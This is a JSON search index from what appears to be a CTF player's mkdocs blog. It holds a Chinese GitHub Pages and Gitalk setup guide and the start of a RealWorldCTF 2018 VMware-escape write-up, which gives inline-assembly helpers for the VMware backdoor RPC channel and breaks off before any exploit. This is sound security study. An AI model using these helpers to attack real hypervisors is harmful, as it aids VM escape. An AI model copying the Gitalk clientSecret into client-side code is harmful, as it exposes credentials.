{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to b1b1's share b1b1 : CTFer, leader of r3kapig focus on : Kernel, Blockchain, CTF Crypto PWN email : challenges : https://github.com/beafb1b1/challenges","title":"home"},{"location":"#welcome-to-b1b1s-share","text":"b1b1 : CTFer, leader of r3kapig focus on : Kernel, Blockchain, CTF Crypto PWN email : challenges : https://github.com/beafb1b1/challenges","title":"Welcome to b1b1's share"},{"location":"backup/gitpage_fuck/","text":"github pages\u91c7\u5751 dev master User Pages gitpage\u5206\u4e3a\u4e24\u79cd\uff0c\u5173\u4e8e\u4e24\u79cdgitpage\u7684\u8bf4\u660e\u53ef\u4ee5\u53c2\u8003\uff1a https://help.github.com/en/articles/user-organization-and-project-pages \u7b2c\u4e00\u79cd\u53ebProject Pages sites\uff0c\u8fd9\u4e00\u79cd\u7684\u8bdd\u9700\u8981\u5728master\u5206\u652f\u4e0a\u5f00\u53d1\u4ee3\u7801\uff0c\u7136\u540esite\u4f1a\u90e8\u7f72\u5728gh-pages\u5206\u652f\u4e0a\u3002\u8fd9\u79cd\u4f7f\u7528\u7684url\u4e3a http(s):// username .github.io/ projectname \u8fd9\u79cd\u6a21\u5f0f\u3002 \u53e6\u5916\u4e00\u79cd\u53ebUser and Organization Pages sites\uff0c\u8fd9\u4e00\u79cd\u9700\u8981\u5728\u5176\u4ed6\u5730\u65b9\u5f00\u53d1\u4ee3\u7801\uff0c\u7136\u540e\u5c06site\u63a8\u9001\u5230master\u5206\u652f\u4e0a\uff0cgitpage\u4f1a\u76f4\u63a5\u6839\u636emaster\u5206\u652f\u5efa\u7ad9\u3002\u8fd9\u79cd\u4f7f\u7528\u7684url\u4e3a https:// username .github.io \u3002 mkdocs\u8fd9\u4e24\u79cd\u65b9\u5f0f\u90fd\u652f\u6301\uff0c\u4f46\u662f\u56e0\u4e3a\u7b2c\u4e00\u79cd\u65b9\u5f0f\u9700\u8981\u540e\u63a5\u4e00\u4e2aprojectname\uff0c\u6240\u4ee5\u6211\u66f4\u503e\u5411\u4e8e\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u3002\u4f46\u662f\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u4e0d\u80fd\u518dmaster\u5206\u652f\u4e0a\u521b\u5efa\u4ee3\u7801\uff0c\u9700\u8981\u672c\u5730\u521b\u5efa\u5b8c\u6210\u540e\u624d\u884c\uff0c\u56e0\u4e3a\u6211\u65b0\u5f00\u4e86\u4e00\u4e2adev\u5206\u652f\uff0c\u5e76\u8bbe\u5b9a\u4e3a\u9ed8\u8ba4\u5206\u652f\uff0c\u7136\u540e\u7f16\u8f91\u5b8c\u6210\u540e\u5728\u672c\u5730\u7f16\u8bd1\u5230master\u5206\u652f\u4e0a\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528\u540c\u4e00\u4e2a\u9879\u76ee\u5b8c\u6210\u8fd9\u4e2a\u7ad9\u70b9\uff08\u6309\u7167mkdocs\u5b98\u65b9\u7684\u8bf4\u6cd5\uff0c\u9700\u8981\u5f04\u4e24\u4e2a\u9879\u76ee\u624d\u884c\uff0c\u4e0d\u63a8\u8350\uff09\u3002 \u64cd\u4f5c\u8bb0\u5f55 mkdocs\u7684theme\u63a8\u8350mkdocs-material\uff0c\u5efa\u7ad9\u65b9\u6cd5\u975e\u5e38\u7b80\u5355\uff0c\u9996\u5148\u521b\u7acb\u597d\u9879\u76ee\uff0c\u8bbe\u5b9a\u597dmaster\u5206\u652f\u548cdev\u5206\u652f\uff0c\u672c\u5730pip\u5b89\u88c5mkdocs\u548ctheme\uff1a pip install mkdocs pip install mkdocs-material \u5c06dev\u5206\u652fclone\u4e0b\u6765\uff0c\u800c\u540e\u5728\u76ee\u5f55\u6267\u884c\uff1a mkdocs new myblog \u5c06myblog\u76ee\u5f55\u5185\u7684\u5185\u5bb9\u62f7\u8d1d\u51fa\u6765\uff0c\u5e76\u628amyblog\u76ee\u5f55\u5220\u9664\uff08\u7f51\u4e0a\u8bf4\u76f4\u63a5\u5728git\u7684\u76ee\u5f55\u4e0bnew\u53ef\u80fd\u4f1a\u51fa\u73b0git\u7684\u95ee\u9898\uff09\u3002 \u7136\u540e\u6839\u636emkdocs-material\u7684\u6587\u6863\u5bf9\u914d\u7f6e\u6587\u4ef6\u548c\u6587\u6863\u8fdb\u884c\u4fee\u6539\u548c\u7f16\u5199\uff1a https://squidfunk.github.io/mkdocs-material/ \u3002 \u4fee\u6539\u5b8c\u6210\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 mkdocs serve \u5728\u672c\u673a\u642d\u5efa\u67e5\u770b\u3002\u800c\u540e\u91cd\u70b9\u6765\u4e86\uff0c\u56e0\u4e3a\u6211\u4eec\u5728dev\u5206\u652f\u5f00\u53d1\uff0c\u800c\u6211\u4eec\u8981\u63a8\u9001\u5230master\u5206\u652f\uff0c\u56e0\u6b64\u9700\u8981\u5728\u90e8\u7f72\u7684\u65f6\u5019\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff1a mkdocs gh-deploy --remote-branch master \u3002 \u81f3\u6b64\u63a8\u9001\u5b8c\u6210\u3002\u53e6\u5916\u63a8\u8350gittalk\u4f5c\u4e3acomment\u8fdb\u884c\u4f7f\u7528\u3002 \u9996\u5148\u7533\u8bf7\u4e00\u4e2a\u65b0\u7684comment\u9879\u76ee\uff0c\u4e4b\u540e\u4f7f\u7528gittalk\u7684\u65f6\u5019\u7684\u6bcf\u4e00\u4e2a\u9875\u9762\u4e0a\u7684\u8bc4\u8bba\u90fd\u662f\u8fd9\u4e2a\u9879\u76ee\u4e2d\u7684\u4e00\u4e2aissue\u3002 \u7136\u540e\u5230 https://github.com/settings/applications/new \u7533\u8bf7 clientID \u548c clientSecret\u3002 \u6839\u636e\u4f60\u7684\u4fe1\u606f\u51c6\u5907\u5982\u4e0b\u4ee3\u7801\uff1a h2 id= __comments {{ lang.t( meta.comments ) }} /h2 form id= gitalk-form onsubmit= return false; div id= gitalk-container /div /form link rel= stylesheet href= https://unpkg.com/gitalk/dist/gitalk.css script src= https://unpkg.com/gitalk/dist/gitalk.min.js /script script src= https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js /script script const gitalk = new Gitalk({ clientID: , // add yourself s clientSecret: , // add yourself s repo: comment , owner: , // add yourself s admin: [ ], // add yourself s id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render( gitalk-container ) /script \u5230 your_python_path\\Lib\\site-packages\\material\\partials\\integrations \u4e2d\u4f7f\u7528\u4e0a\u8ff0\u4ee3\u7801\u66ff\u6362disqus.html\u4e2d\u7684\u4ee3\u7801\u3002 \u6700\u540e\u91cd\u65b0\u8fd0\u884c mkdocs gh-deploy --remote-branch master \u5373\u53ef\u3002 \u53ef\u4ee5\u4f7f\u7528hackmd\u5bf9\u9879\u76ee\u4e2d\u7684\u6587\u6863\u8fdb\u884c\u7f16\u8f91\uff0c\u5728 https://hackmd.io \u4e2d\u6709\u4e00\u4e2a\u7248\u672c\u9009\u9879\u53ef\u4ee5\u4ecegit\u4e2d\u62c9\u53d6\u6587\u6863\u548c\u63a8\u9001\u6587\u6863\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u91c7\u53d6\u4e86\u8fd9\u91cc\u4f7f\u7528\u7684page\uff0c\u90a3\u4e48\u5728\u62c9\u53d6\u3001\u4fee\u6539\u3001\u63a8\u9001md\u540e\uff0c\u9700\u8981\u5728\u672c\u5730\u540c\u6b65dev\u5206\u652f\uff0c\u7136\u540e\u518d\u6b21\u8fd0\u884c mkdocs gh-deploy --remote-branch master \u6307\u4ee4\u63a8\u9001\u5230master\u5206\u652f\uff0c\u56e0\u4e3agithub\u662f\u4e0d\u4f1a\u81ea\u52a8\u4ece\u4f60\u7684dev\u5206\u652f\u7f16\u8bd1\u5230master\u5206\u652f\u7684\uff0c\u8fd9\u4e5f\u662fmkdocs\u8f83\u4e3a\u9ebb\u70e6\u7684\u5730\u65b9\uff0c\u5982\u679c\u4f7f\u7528\u4e86minimal-mistakes\u7b49theme\u7684\u8bdd\u5c31\u4f1a\u65b9\u4fbf\u4e00\u4e9b\uff0c\u76f4\u63a5\u4fee\u6539md\u6587\u4ef6\u5373\u53ef\u3002","title":"gitpage\u91c7\u5751"},{"location":"backup/gitpage_fuck/#github-pages","text":"","title":"github pages\u91c7\u5751"},{"location":"backup/gitpage_fuck/#devmaster-user-pages","text":"gitpage\u5206\u4e3a\u4e24\u79cd\uff0c\u5173\u4e8e\u4e24\u79cdgitpage\u7684\u8bf4\u660e\u53ef\u4ee5\u53c2\u8003\uff1a https://help.github.com/en/articles/user-organization-and-project-pages \u7b2c\u4e00\u79cd\u53ebProject Pages sites\uff0c\u8fd9\u4e00\u79cd\u7684\u8bdd\u9700\u8981\u5728master\u5206\u652f\u4e0a\u5f00\u53d1\u4ee3\u7801\uff0c\u7136\u540esite\u4f1a\u90e8\u7f72\u5728gh-pages\u5206\u652f\u4e0a\u3002\u8fd9\u79cd\u4f7f\u7528\u7684url\u4e3a http(s):// username .github.io/ projectname \u8fd9\u79cd\u6a21\u5f0f\u3002 \u53e6\u5916\u4e00\u79cd\u53ebUser and Organization Pages sites\uff0c\u8fd9\u4e00\u79cd\u9700\u8981\u5728\u5176\u4ed6\u5730\u65b9\u5f00\u53d1\u4ee3\u7801\uff0c\u7136\u540e\u5c06site\u63a8\u9001\u5230master\u5206\u652f\u4e0a\uff0cgitpage\u4f1a\u76f4\u63a5\u6839\u636emaster\u5206\u652f\u5efa\u7ad9\u3002\u8fd9\u79cd\u4f7f\u7528\u7684url\u4e3a https:// username .github.io \u3002 mkdocs\u8fd9\u4e24\u79cd\u65b9\u5f0f\u90fd\u652f\u6301\uff0c\u4f46\u662f\u56e0\u4e3a\u7b2c\u4e00\u79cd\u65b9\u5f0f\u9700\u8981\u540e\u63a5\u4e00\u4e2aprojectname\uff0c\u6240\u4ee5\u6211\u66f4\u503e\u5411\u4e8e\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u3002\u4f46\u662f\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u4e0d\u80fd\u518dmaster\u5206\u652f\u4e0a\u521b\u5efa\u4ee3\u7801\uff0c\u9700\u8981\u672c\u5730\u521b\u5efa\u5b8c\u6210\u540e\u624d\u884c\uff0c\u56e0\u4e3a\u6211\u65b0\u5f00\u4e86\u4e00\u4e2adev\u5206\u652f\uff0c\u5e76\u8bbe\u5b9a\u4e3a\u9ed8\u8ba4\u5206\u652f\uff0c\u7136\u540e\u7f16\u8f91\u5b8c\u6210\u540e\u5728\u672c\u5730\u7f16\u8bd1\u5230master\u5206\u652f\u4e0a\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528\u540c\u4e00\u4e2a\u9879\u76ee\u5b8c\u6210\u8fd9\u4e2a\u7ad9\u70b9\uff08\u6309\u7167mkdocs\u5b98\u65b9\u7684\u8bf4\u6cd5\uff0c\u9700\u8981\u5f04\u4e24\u4e2a\u9879\u76ee\u624d\u884c\uff0c\u4e0d\u63a8\u8350\uff09\u3002","title":"dev&amp;master User Pages"},{"location":"backup/gitpage_fuck/#_1","text":"mkdocs\u7684theme\u63a8\u8350mkdocs-material\uff0c\u5efa\u7ad9\u65b9\u6cd5\u975e\u5e38\u7b80\u5355\uff0c\u9996\u5148\u521b\u7acb\u597d\u9879\u76ee\uff0c\u8bbe\u5b9a\u597dmaster\u5206\u652f\u548cdev\u5206\u652f\uff0c\u672c\u5730pip\u5b89\u88c5mkdocs\u548ctheme\uff1a pip install mkdocs pip install mkdocs-material \u5c06dev\u5206\u652fclone\u4e0b\u6765\uff0c\u800c\u540e\u5728\u76ee\u5f55\u6267\u884c\uff1a mkdocs new myblog \u5c06myblog\u76ee\u5f55\u5185\u7684\u5185\u5bb9\u62f7\u8d1d\u51fa\u6765\uff0c\u5e76\u628amyblog\u76ee\u5f55\u5220\u9664\uff08\u7f51\u4e0a\u8bf4\u76f4\u63a5\u5728git\u7684\u76ee\u5f55\u4e0bnew\u53ef\u80fd\u4f1a\u51fa\u73b0git\u7684\u95ee\u9898\uff09\u3002 \u7136\u540e\u6839\u636emkdocs-material\u7684\u6587\u6863\u5bf9\u914d\u7f6e\u6587\u4ef6\u548c\u6587\u6863\u8fdb\u884c\u4fee\u6539\u548c\u7f16\u5199\uff1a https://squidfunk.github.io/mkdocs-material/ \u3002 \u4fee\u6539\u5b8c\u6210\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 mkdocs serve \u5728\u672c\u673a\u642d\u5efa\u67e5\u770b\u3002\u800c\u540e\u91cd\u70b9\u6765\u4e86\uff0c\u56e0\u4e3a\u6211\u4eec\u5728dev\u5206\u652f\u5f00\u53d1\uff0c\u800c\u6211\u4eec\u8981\u63a8\u9001\u5230master\u5206\u652f\uff0c\u56e0\u6b64\u9700\u8981\u5728\u90e8\u7f72\u7684\u65f6\u5019\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff1a mkdocs gh-deploy --remote-branch master \u3002 \u81f3\u6b64\u63a8\u9001\u5b8c\u6210\u3002\u53e6\u5916\u63a8\u8350gittalk\u4f5c\u4e3acomment\u8fdb\u884c\u4f7f\u7528\u3002 \u9996\u5148\u7533\u8bf7\u4e00\u4e2a\u65b0\u7684comment\u9879\u76ee\uff0c\u4e4b\u540e\u4f7f\u7528gittalk\u7684\u65f6\u5019\u7684\u6bcf\u4e00\u4e2a\u9875\u9762\u4e0a\u7684\u8bc4\u8bba\u90fd\u662f\u8fd9\u4e2a\u9879\u76ee\u4e2d\u7684\u4e00\u4e2aissue\u3002 \u7136\u540e\u5230 https://github.com/settings/applications/new \u7533\u8bf7 clientID \u548c clientSecret\u3002 \u6839\u636e\u4f60\u7684\u4fe1\u606f\u51c6\u5907\u5982\u4e0b\u4ee3\u7801\uff1a h2 id= __comments {{ lang.t( meta.comments ) }} /h2 form id= gitalk-form onsubmit= return false; div id= gitalk-container /div /form link rel= stylesheet href= https://unpkg.com/gitalk/dist/gitalk.css script src= https://unpkg.com/gitalk/dist/gitalk.min.js /script script src= https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js /script script const gitalk = new Gitalk({ clientID: , // add yourself s clientSecret: , // add yourself s repo: comment , owner: , // add yourself s admin: [ ], // add yourself s id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render( gitalk-container ) /script \u5230 your_python_path\\Lib\\site-packages\\material\\partials\\integrations \u4e2d\u4f7f\u7528\u4e0a\u8ff0\u4ee3\u7801\u66ff\u6362disqus.html\u4e2d\u7684\u4ee3\u7801\u3002 \u6700\u540e\u91cd\u65b0\u8fd0\u884c mkdocs gh-deploy --remote-branch master \u5373\u53ef\u3002 \u53ef\u4ee5\u4f7f\u7528hackmd\u5bf9\u9879\u76ee\u4e2d\u7684\u6587\u6863\u8fdb\u884c\u7f16\u8f91\uff0c\u5728 https://hackmd.io \u4e2d\u6709\u4e00\u4e2a\u7248\u672c\u9009\u9879\u53ef\u4ee5\u4ecegit\u4e2d\u62c9\u53d6\u6587\u6863\u548c\u63a8\u9001\u6587\u6863\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u91c7\u53d6\u4e86\u8fd9\u91cc\u4f7f\u7528\u7684page\uff0c\u90a3\u4e48\u5728\u62c9\u53d6\u3001\u4fee\u6539\u3001\u63a8\u9001md\u540e\uff0c\u9700\u8981\u5728\u672c\u5730\u540c\u6b65dev\u5206\u652f\uff0c\u7136\u540e\u518d\u6b21\u8fd0\u884c mkdocs gh-deploy --remote-branch master \u6307\u4ee4\u63a8\u9001\u5230master\u5206\u652f\uff0c\u56e0\u4e3agithub\u662f\u4e0d\u4f1a\u81ea\u52a8\u4ece\u4f60\u7684dev\u5206\u652f\u7f16\u8bd1\u5230master\u5206\u652f\u7684\uff0c\u8fd9\u4e5f\u662fmkdocs\u8f83\u4e3a\u9ebb\u70e6\u7684\u5730\u65b9\uff0c\u5982\u679c\u4f7f\u7528\u4e86minimal-mistakes\u7b49theme\u7684\u8bdd\u5c31\u4f1a\u65b9\u4fbf\u4e00\u4e9b\uff0c\u76f4\u63a5\u4fee\u6539md\u6587\u4ef6\u5373\u53ef\u3002","title":"\u64cd\u4f5c\u8bb0\u5f55"},{"location":"backup/realworldctf_2018_stationescape/","text":"RealWorldCTF Final Station-Escape Writeup RWCTF Final 2018\u662f\u6211\u4eec\u89c9\u5f97\u975e\u5e38\u4e0d\u9519\u7684\u4e00\u6b21\u7ade\u8d5b\uff0c\u975e\u5e38\u8d34\u8fd1\u5b9e\u6218\uff0c\u5176\u4e2d\u6bcf\u9053\u9898\u76ee\u90fd\u503c\u5f97\u6df1\u5165\u7814\u7a76\u3002\u5176\u4e2dStation-Escape\u662f\u4e00\u9053VMWare Workstation\u9003\u9038\u7684\u9898\u76ee\uff0c\u6211\u4eec\u89c9\u5f97\u975e\u5e38cool\uff0c\u6240\u4ee5\u8fdb\u884c\u4e86\u8be6\u7ec6\u5206\u6790\uff0c\u8fd9\u91cc\u975e\u5e38\u611f\u8c22\u957f\u4ead\u79d1\u6280\u7684flyyy\u5e08\u5085\u8d21\u732e\u7684\u975e\u5e38\u4f18\u79c0\u7684\u9898\u76ee\u548c\u6089\u5fc3\u7684\u6280\u672f\u6307\u5bfc\u3002\u672c\u6587\u5206\u6790\u5de5\u4f5c\u7531r3kapig\u7684Ne0\u548cbibi\u5b8c\u6210\u3002 \u524d\u7f6e\u77e5\u8bc6 \u5728VMWare\u4e2d\uff0c\u6709\u4e00\u4e2a\u5947\u7279\u7684\u653b\u51fb\u9762\uff0c\u5c31\u662fvmtools\u3002vmtools\u5e2e\u52a9\u5bbf\u4e3b\u673a\u548c\u5ba2\u6237\u673a\u5b8c\u6210\u5305\u62ec\u6587\u4ef6\u4f20\u8f93\u5728\u5185\u7684\u4e00\u7cfb\u5217\u7684\u901a\u4fe1\u548c\u4ea4\u4e92\uff0c\u5176\u4e2d\u4f7f\u7528\u4e86\u4e00\u79cd\u88ab\u79f0\u4e3abackdoor\u7684\u63a5\u53e3\u3002backdoor\u63a5\u53e3\u662f\u5982\u4f55\u548c\u5bbf\u4e3b\u673a\u8fdb\u884c\u901a\u4fe1\u7684\u5462\uff0c\u6211\u4eec\u89c2\u5bdfbackdoor\u51fd\u6570\u7684\u5b9e\u73b0\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u4ee3\u7801\uff1a MOV EAX , 564 D5868h /* magic number */ MOV EBX , command - specific - parameter MOV CX , backdoor - command - number MOV DX , 5658 h /* VMware I/O Port */ IN EAX , DX ( or OUT DX , EAX ) \u9996\u5148\u9700\u8981\u660e\u786e\u7684\u662f\uff0c\u8be5\u63a5\u53e3\u5728\u7528\u6237\u6001\u5c31\u53ef\u4ee5\u4f7f\u7528\u3002\u5728\u901a\u5e38\u73af\u5883\u4e0b\uff0cIN\u6307\u4ee4\u662f\u4e00\u6761\u7279\u6743\u6307\u4ee4\uff0c\u5728\u666e\u901a\u7528\u6237\u6001\u7a0b\u5e8f\u4e0b\u662f\u65e0\u6cd5\u4f7f\u7528\u7684\u3002\u56e0\u6b64\uff0c\u8fd0\u884c\u8fd9\u6761\u6307\u4ee4\u4f1a\u8ba9\u7528\u6237\u6001\u7a0b\u5e8f\u51fa\u9519\u5e76\u9677\u51fa\u5230hypervisor\u5c42\uff0c\u4ece\u800chypervisor\u5c42\u53ef\u4ee5\u5bf9\u5ba2\u6237\u673a\u8fdb\u884c\u76f8\u5173\u7684\u64cd\u4f5c\u548c\u5904\u7406\uff0c\u56e0\u6b64\u5229\u7528\u6b64\u673a\u5236\u5b8c\u6210\u4e86\u901a\u4fe1\u3002\u5229\u7528backdoor\u7684\u901a\u4fe1\u673a\u5236\uff0c\u5ba2\u6237\u673a\u4fbf\u53ef\u4ee5\u4f7f\u7528RPC\u8fdb\u884c\u4e00\u7cfb\u5217\u7684\u64cd\u4f5c\uff0c\u4f8b\u5982\u62d6\u653e\u3001\u590d\u5236\u3001\u83b7\u53d6\u4fe1\u606f\u3001\u53d1\u9001\u4fe1\u606f\u7b49\u7b49\u3002 backdoor\u673a\u5236\u6240\u6709\u7684\u547d\u4ee4\u548c\u8c03\u7528\u65b9\u6cd5\uff0c\u57fa\u672c\u90fd\u662f\u9996\u5148\u8bbe\u7f6e\u5bc4\u5b58\u5668\u3001\u7136\u540e\u8c03\u7528IN\u6216OUT\u7279\u6743\u6307\u4ee4\u7684\u6a21\u5f0f\u3002\u90a3\u4e48\u6211\u4eec\u4f7f\u7528backdoor\u4f20\u8f93RPC\u6307\u4ee4\u9700\u8981\u7ecf\u8fc7\u54ea\u4e9b\u6b65\u9aa4\u5462\uff1f\u6211\u4eec\u4ee5\u672c\u9898\u6d89\u53ca\u5230\u7684backdoor\u64cd\u4f5c\u8fdb\u884c\u8bf4\u660e\uff1a +------------------+ | Open RPC channel | +---------+--------+ | +------------ v -----------+ | Send RPC command length | +------------+-----------+ | +------------ v -----------+ | Send RPC command data | +------------+-----------+ | +------------- v ------------+ | Recieve RPC reply length | +-------------+------------+ | +------------ v -----------+ | Receive RPC reply data | +------------+-----------+ | +-------------- v -------------+ | Finish receiving RPC reply | +--------------+-------------+ | +--------- v ---------+ | Close RPC channel | +-------------------+ \u4ee5\u4e0b\u5185\u5bb9\u4e3b\u8981\u53c2\u8003\uff08\u8be5\u6587\u6863\u548c\u771f\u5b9e\u9006\u5411\u60c5\u51b5\u7565\u6709\u51fa\u5165\uff0c\u5c06\u4f1a\u5728\u540e\u6587\u4e2d\u8bf4\u660e\uff09\uff1a https://sites.google.com/site/chitchatvmback/backdoor Open RPC channel RPC subcommand\uff1a00h \u8c03\u7528IN\uff08OUT\uff09\u524d\uff0c\u9700\u8981\u8bbe\u7f6e\u7684\u5bc4\u5b58\u5668\u5185\u5bb9\uff1a EAX = 564 D5868h - magic number EBX = 49435052 h - RPC open magic number ( RPCI ) ECX ( HI ) = 0000 h - subcommand number ECX ( LO ) = 001 Eh - command number EDX ( LO ) = 5658 h - port number \u8fd4\u56de\u503c\uff1a ECX = 00010000 h : success / 00000000 h : failure EDX ( HI ) = RPC channel number \u8be5\u529f\u80fd\u7528\u4e8e\u6253\u5f00RPC\u7684channel\uff0c\u5176\u4e2dECX\u4f1a\u8fd4\u56de\u662f\u5426\u6210\u529f\uff0cEDX\u8fd4\u56de\u503c\u4f1a\u8fd4\u56de\u4e00\u4e2achannel\u7684\u7f16\u53f7\uff0c\u5728\u540e\u7eed\u7684RPC\u901a\u4fe1\u4e2d\uff0c\u5c06\u4f7f\u7528\u8be5\u7f16\u53f7\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u5355\u4e2a\u865a\u62df\u673a\u4e2d\u53ea\u80fd\u540c\u65f6\u4f7f\u75288\u4e2achannel\uff08 #0 - #7 \uff09,\u5f53\u5c1d\u8bd5\u6253\u5f00\u7b2c9\u4e2achannel\u7684\u65f6\u5019\uff0c\u4f1a\u68c0\u67e5\u5176\u4ed6channel\u7684\u6253\u5f00\u65f6\u95f4\uff0c\u5982\u679c\u65f6\u95f4\u8fc7\u4e86\u67d0\u4e00\u4e2a\u503c\uff0c\u4f1a\u5c06\u8d85\u65f6\u7684channel\u5173\u95ed\uff0c\u518d\u628a\u8fd9\u4e2achannel\u7684\u7f16\u53f7\u8fd4\u56de\uff1b\u5982\u679c\u90fd\u6ca1\u6709\u8d85\u65f6\uff0ccreate channel\u4f1a\u5931\u8d25\u3002 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u51fd\u6570\u5b9e\u73b0Open RPC channel\u7684\u8fc7\u7a0b\uff1a void channel_open ( int * cookie1 , int * cookie2 , int * channel_num , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%rdi,%%r10 \\n\\t movq %%rsi,%%r11 \\n\\t movq %%rdx,%%r12 \\n\\t movq %%rcx,%%r13 \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0xc9435052,%%ebx \\n\\t movl $0x1e,%%ecx \\n\\t movl $0x5658,%%edx \\n\\t out %%eax,%%dx \\n\\t movl %%edi,(%%r10) \\n\\t movl %%esi,(%%r11) \\n\\t movl %%edx,(%%r12) \\n\\t movl %%ecx,(%%r13) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r8 , %r10 , %r11 , %r12 , %r13 ); } Send RPC command length RPC subcommand\uff1a01h \u8c03\u7528\uff1a EAX = 564 D5868h - magic number EBX = command length ( not including the terminating NULL ) ECX ( HI ) = 0001 h - subcommand number ECX ( LO ) = 001 Eh - command number EDX ( HI ) = channel number EDX ( LO ) = 5658 h - port number \u8fd4\u56de\u503c\uff1a ECX = 00 810000 h : success / 00000000 h : failure \u5728\u53d1\u9001RPC command\u524d\uff0c\u9700\u8981\u5148\u53d1\u9001RPC command\u7684\u957f\u5ea6\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6b64\u65f6\u6211\u4eec\u8f93\u5165\u7684channel number\u6240\u6307\u5411\u7684channel\u5fc5\u987b\u5904\u4e8e\u5df2\u7ecfopen\u7684\u72b6\u6001\u3002ECX\u4f1a\u8fd4\u56de\u662f\u5426\u6210\u529f\u53d1\u9001\u3002\u5177\u4f53\u5b9e\u73b0\u5982\u4e0b\uff1a void channel_set_len ( int cookie1 , int cookie2 , int channel_num , int len , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%r8,%%r10 \\n\\t movl %%ecx,%%ebx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0001001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 ); } Send RPC command data RPC subcommand\uff1a02h \u8c03\u7528\uff1a EAX = 564 D5868h - magic number EBX = 4 bytes from the command data ( the first byte in LSB ) ECX ( HI ) = 0002 h - subcommand number ECX ( LO ) = 001 Eh - command number EDX ( HI ) = channel number EDX ( LO ) = 5658 h - port number \u8fd4\u56de\u503c: ECX = 000010000 h : success / 00000000 h : failure \u8be5\u529f\u80fd\u5fc5\u987b\u5728Send RPC command length\u540e\u4f7f\u7528,\u6bcf\u6b21\u53ea\u80fd\u53d1\u90014\u4e2a\u5b57\u8282\u3002\u4f8b\u5982\uff0c\u5982\u679c\u8981\u53d1\u9001\u547d\u4ee4 machine.id.get \uff0c\u90a3\u4e48\u5fc5\u987b\u8981\u8c03\u75284\u6b21\uff0c\u5206\u522b\u4e3a\uff1a EBX set to 6863616 Dh ( mach ) EBX set to 2E656 E69h ( ine. ) EBX set to 672E6469 h ( id.g ) EBX set to 00007465 h ( et \\x00\\x00 ) ECX\u4f1a\u8fd4\u56de\u662f\u5426\u6210\u529f\uff0c\u5177\u4f53\u5b9e\u73b0\u5982\u4e0b\uff1a void channel_send_data ( int cookie1 , int cookie2 , int channel_num , int len , char * data , int * res ){ asm ( pushq %%rbp \\n\\t movq %%r9,%%r10 \\n\\t movq %%r8,%%rbp \\n\\t movq %%rcx,%%r11 \\n\\t movq $0,%%r12 \\n\\t 1: \\n\\t movq %%r8,%%rbp \\n\\t add %%r12,%%rbp \\n\\t movl (%%rbp),%%ebx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0002001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t addq $4,%%r12 \\n\\t cmpq %%r12,%%r11 \\n\\t ja 1b \\n\\t movl %%ecx,(%%r10) \\n\\t popq %%rbp \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 , %r11 , %r12 ); } Recieve RPC reply length RPC subcommand\uff1a03h \u8c03\u7528\uff1a EAX = 564 D5868h - magic number ECX ( HI ) = 0003 h - subcommand number ECX ( LO ) = 001 Eh - command number EDX ( HI ) = channel number EDX ( LO ) = 5658 h - port number \u8fd4\u56de\u503c\uff1a EBX = reply length ( not including the terminating NULL ) ECX = 00 830000 h : success / 00000000 h : failure \u63a5\u6536RPC reply\u7684\u957f\u5ea6\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u6240\u6709\u7684RPC command\u90fd\u4f1a\u8fd4\u56de\u81f3\u5c112\u4e2a\u5b57\u8282\u7684reply\u7684\u6570\u636e\uff0c\u5176\u4e2d 1 \u8868\u793a success , 0 \u8868\u793a failure \uff0c\u5373\u4f7fVMware\u65e0\u6cd5\u8bc6\u522bRPC command\uff0c\u4e5f\u4f1a\u8fd4\u56de 0 Unknown command \u4f5c\u4e3areply\u3002\u4e5f\u5c31\u662f\u8bf4\uff0creply\u6570\u636e\u7684\u524d\u4e24\u4e2a\u5b57\u8282\u59cb\u7ec8\u8868\u793aRPC command\u547d\u4ee4\u7684\u72b6\u6001\u3002 void channel_recv_reply_len ( int cookie1 , int cookie2 , int channel_num , int * len , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%r8,%%r10 \\n\\t movq %%rcx,%%r11 \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0003001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t movl %%ebx,(%%r11) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 , %r11 ); } Receive RPC reply data RPC subcommand\uff1a04h \u8c03\u7528\uff1a EAX = 564 D5868h - magic number EBX = reply type from subcommand 